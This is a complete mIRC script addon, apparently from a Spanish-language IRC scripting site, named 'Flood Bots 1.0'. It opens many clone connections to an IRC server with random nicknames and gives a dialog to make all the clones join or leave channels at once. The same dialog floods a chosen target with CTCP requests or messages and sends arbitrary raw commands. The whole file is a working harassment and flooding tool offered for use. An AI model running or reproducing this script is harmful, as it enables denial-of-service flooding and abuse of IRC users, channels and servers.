;~~~~~~~~~~~~~~~~~~~~~~
; Flood Bots 1.0 (beta)
; Autor: Jimmy_RAY
; e-mail: jimmy@welt.es
; Visita http://backbeat.welt.es
;~~~~~~~~~~~~~~~~~~~~~~
menu nicklist,status,menubar,channel { 
  -
  &Flood Bots
  .&Flood Bots:floodbots
  .-
  .&Créditos: { 
    echo 2 -a ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    echo 2 -a *** Flood Bots 1.0
    echo 2 -a *** AddOn escrito por Jimmy_RAY
    echo 2 -a *** http://backbeat.welt.es
    echo 2 -a *** email: jimmy@welt.es
    echo 2 -a ~~~~~~~~~~~~~~~~~~~~~~~~~~~
  }
}
on 1:start: /echo 2 -s *** Flood Bots 1.0 por Jimmy_RAY: teclea /floodbots 
alias floodbots {
  if ($findfile($mircdir,fbsrv.dat,1) == $null) write -c $fb.servers.dat
  if ($dialog(fb)) dialog -v fb
  else  dialog -dm fb fb
  .timerfbon 0 1 fb.ifon
}
alias fb.ifon { if ($dialog(fb) == $null) { .timerfbon off | .sockclose fb.* } }
dialog fb {
  title "FloodBots v1.0 - Jimmy_RAY -"
  size -1 -1 365 220
  option dbu
  box "Conectar",1,5 5 200 50
  text "Servidor:",2,10 20 21 10
  combo 3,35 18 80 50,drop,edit
  text "Puerto:",4,120 20 20 10
  edit "6667",5,145 18 30 10,autohs
  button "&Editar",6,180 18 20 10
  button "&Conectar!",7,35 35 80 15,default
  button "&Desconectar todos",8,145 35 55 15
  box "Comandos",9,5 55 200 140
  box "Entradas y Salidas",10,10 65 190 25
  button "&Entrar",11,15 73 30 10
  button "&Salir",12,50 73 30 10
  text "Canal:",13,110 75 20 10
  edit "",14,130 73 65 10,autohs
  box "Ctcps",15,10 90 190 25
  button "&Mandar",16,15 98 30 10
  combo 17,50 98 50 50,drop
  text "Objetivo:",18,105 100 21 10
  edit "",19,130 98 65 10,autohs
  box "Mensajes",20,10 115 190 25
  button "&Mandar",21,15 123 30 10
  edit "",22,50 123 50 10,autohs
  text "Objetivo:",23,105 125 21 10
  edit "",24,130 123 65 10,autohs
  box "Otro comando",25,10 140 190 25
  button "&Mandar",26,15 148 30 10
  edit "",27,50 148 145 10
  box "NiCKs",28,10 165 190 25
  button "&Mandar",29,15 173 30 10
  radio "Lemmings",30,70 175 35 10
  radio "Aleatorio",31,115 175 35 10
  box "Información",33,210 5 150 50
  text "Clones conectados:",34,215 20 50 10
  edit "",35,270 18 30 10,read,right
  text "Puertos abiertos:",36,215 40 50 10
  edit "",37,270 38 30 10,read,right
  box "Debug",38,210 55 150 140,
  edit "",39,215 65 140 105,read,multi,vsbar
  button "&Limpiar log",40,310 173 35 15
  button "&Cerrar",41,330 200 30 15,cancel
}
;Eventos de diálogos
on 1:dialog:fb:init:*: {
  set -u %i 1
  while ($fb.servers(%i)) {
    did -a fb 3 $fb.servers(%i)
  inc %i }
  did -c fb 3 1 | did -a fb 17 VERSION | did -a fb 17 PING | did -a fb 17 TIME | did -a fb 17 FINGER | did -a fb 17 USERINFO | did -a fb 17 CLIENTINFO | did -c fb 17 1 |did -c fb 30 
  %fb.sockopen = 0
  %fb.sockclon = 0
  %fb.sockcont = 0
  fb.date | .timer -m 1 1 fb.butcon | .sockclose fb.* 
  if (%fb.nick == $null) { set %fb.nick 30 }
  did -c fb %fb.nick
}
on 1:dialog:fb:sclick:*: {
  ;Botones de comandos:
  if ($did == 11) { sw fb.* JOIN $did(fb,14) | fb.wlog *** Entrando en $did(fb,14) }
  if ($did == 12) { sw fb.* PART $did(fb,14) | fb.wlog *** Saliendo de $did(fb,14) }
  if ($did == 16) { sw fb.* PRIVMSG $did(fb,19) : $+ $did(fb,17,$did(fb,17).sel).text $+   | fb.wlog *** Flood CTCP $did(fb,17,$did(fb,17).sel).text a $did(fb,19) } 
  if ($did == 21) { sw fb.* PRIVMSG $did(fb,24) : $+ $did(fb,22) | fb.wlog *** Mensaje a $did(fb,24) } 
  if ($did == 26) { sw fb.* $did(fb,27) | fb.wlog *** Otro comando }
  ;Resto
  if ($did == 6) run $fb.servers.dat
  if ($did == 40) did -r fb 39
  if ($did == 8) {
    set -u %i 0
    :loop
    if (%i <= %fb.sockcont) {
      sw fb. $+ %i QUIT : $+ 2AddOns & Scripts en http://backbeat.welt.es
    inc %i | goto loop } 
    .sockclose fb.* | fb.wlog *** Clones desconectados | fb.date | fb.butcon
    %fb.sockopen = 0
    %fb.sockclon = 0
    %fb.sockcont = 0
    fb.date  
  }
  if ($did == 29) { set -u %i 0 | :looptwo 
    if (%i <= %fb.sockcont) {
  sw fb. $+ %i NICK $fb.nickclon | inc %i | goto looptwo } }
  if ($did == 30) set %fb.nick $did
  if ($did == 31) set %fb.nick $did
  fb.butcon
  if  ($did == 7) { fb.conclon | did -b fb 7 | .timerfb.1 -m 1 700 did -e fb 7 } 
}
on 1:dialog:fb:edit:*: { .timer -m 1 1 fb.butcon | .timer -m 1 1 fb.date }
;Alias
alias did { if ($dialog($2)) did $1- }
alias sw { if ($sock($1)) { sockwrite -nt $1- } }
alias fb.date { did -ra fb 35 %fb.sockclon | did -ra fb 37 %fb.sockopen
  if (%fb.sockclon == 0) did -b fb 8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
  if (%fb.sockclon != 0) {
    did -e fb 8,9,10,13,14,15,17,18,19,20,22,23,24,25,27,28,29
    did $iif($did(fb,14),-e,-b) fb 11
    did $iif($did(fb,14),-e,-b) fb 12
    did $iif($did(fb,19),-e,-b) fb 16
    if ($did(fb,22)) && ($did(fb,24))  did -e fb 21
    if ($did(fb,22) == $null) || ($did(fb,24) == $null) did -b fb 21
    did $iif($did(fb,27),-e,-b) fb 26
    did $iif($did(fb,19),-e,-b) fb 16
    did $iif($did(fb,19),-e,-b) fb 16
    did $iif($did(fb,19),-e,-b) fb 16
} }
alias fb.butcon {
  if ($did(fb,3)) && ($did(fb,5)) did -e fb 7
  if ($did(fb,3) == $null) || ($did(fb,5) == $null) did -b fb 7
}
;Identificadores:
alias fb.wlog did -i fb 39 1 $1-
alias fb.servers return $read -l $1 fbsrv.dat
alias fb.servers.dat return fbsrv.dat
alias fb.nickclon {
  if (%fb.nick == 30) return lemming $+ $rand(0,99) 
  else return $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z)
}
;--------------------------
;Conectando...
;--------------------------
alias fb.conclon {
  inc %fb.sockcont
  inc %fb.sockopen
  fb.date
  fb.wlog -> Lanzando un clon a $did(fb,3) ( $+ $did(fb,5) $+ )
  sockopen fb. $+ %fb.sockcont $did(fb,3) $did(fb,5)
}
on 1:sockopen:fb.*: {
  if ($sockerr > 1) {
    dec %fb.sockopen
    .sockclose $sockname
    fb.date
    fb.wlog <- Error en la conexión con el servidor.
  }
  else {
    inc %fb.sockclon
    sw $sockname NICK $fb.nickclon
    sw $sockname USER $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z)
    fb.date
    fb.wlog -> Conexión aceptada por parte de $sock($sockname,1).ip
} }
on 1:sockclose:fb.*: {
  dec %fb.sockopen
  dec %fb.sockclon
  fb.date
  fb.wlog <- Un clon desconectado de $sock($sockname,1).ip
}
on 1:sockread:fb.*: { 
  :nextread
  sockread %sockread.tmp
  if ($sockbr == 0) return
  if (%sockread.tmp == $null) %sockread.tmp = -
  if ($left(%sockread.tmp,1) == :) && ($gettok(%sockread.tmp,2,32) == 001) sw $sockname USERHOST $gettok(%sockread.tmp, 3,32)
  if ($left(%sockread.tmp,1) == :) && ($gettok(%sockread.tmp,2,32) == 433) sw $sockname NICK $fb.nickclon $+ $rand(0,9)
  if ($left(%sockread.tmp,1) == :) && ($gettok(%sockread.tmp,2,32) == 432) sw $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,9)
  if ($gettok(%sockread.tmp,1,32) == PING)  { sw $sockname PONG $gettok(%sockread.tmp,2,32) | sw $sockname silence *!*@* }
  goto nextread
}
